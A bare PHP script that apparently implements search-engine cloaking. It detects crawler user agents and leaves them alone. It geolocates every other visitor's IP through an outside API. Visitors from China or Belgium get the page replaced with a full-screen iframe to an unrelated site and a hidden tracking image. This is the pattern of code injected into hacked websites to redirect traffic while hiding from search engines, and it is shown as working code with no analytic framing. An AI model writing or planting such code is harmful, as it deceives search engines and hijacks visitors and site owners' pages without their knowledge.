<?php

	function check_google(){
		$return = false;
		$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
		if(strpos($useragent, 'google') or strpos($useragent, 'yahoo') or strpos($useragent, 'bot') or strpos($useragent, 'msn') or strpos($useragent, 'bing') or strpos($useragent, 'bot') or strpos($useragent, 'yandex')){$return = true;}
		return $return;
	}

	function GetIP(){
		if(!empty($_SERVER["HTTP_CLIENT_IP"])){ $cip = $_SERVER["HTTP_CLIENT_IP"]; }
		elseif(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])){ $cip = $_SERVER["HTTP_X_FORWARDED_FOR"]; }
		elseif(!empty($_SERVER["REMOTE_ADDR"])){ $cip = $_SERVER["REMOTE_ADDR"]; }
		else{ $cip = "127.0.0.1"; }
		return $cip;
	}

	$cust_ip = GetIP();
	$lookup_url='http://api.geoiplookup.net/?query='.$cust_ip;
	$return_xml = file_get_contents($lookup_url);
	preg_match_all( "/\<countrycode\>(.*?)\<\/countrycode\>/", $return_xml, $country_code);
	$country_name=$country_code[1][0];
	if(check_google()){}
	elseif($country_name == 'CN' or $country_name=='BE'){ echo '<iframe name="shop"  src="https://www.gotoweb.com" frameborder="0" scrolling="auto"  width="100%" height="100%"></iframe><img src="http://www.analysis.com/" style="border:0" alt="" />';exit();}
	else{}
?>